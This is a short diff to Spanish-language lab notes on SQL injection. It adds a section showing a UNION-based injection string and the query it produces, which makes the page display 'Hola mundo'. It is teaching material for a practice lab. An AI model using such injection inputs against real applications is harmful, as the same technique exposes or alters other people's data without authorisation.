@@ -47,3 +47,12 @@ Inyecciones que muestran todos los productos:
 ![](capturas/sql-injection-lab1-4.png)
 
 
+# Muestra el mensaje “Hola mundo” usando SQL Injection
+Consulta SQL:
+```
+SELECT * from articulos where Nombre = '999' UNION SELECT null, null, 'Hola mundo' from dual #
+```
+Inyección:
+```
+999' UNION SELECT null, null, 'Hola mundo' from dual #
+```
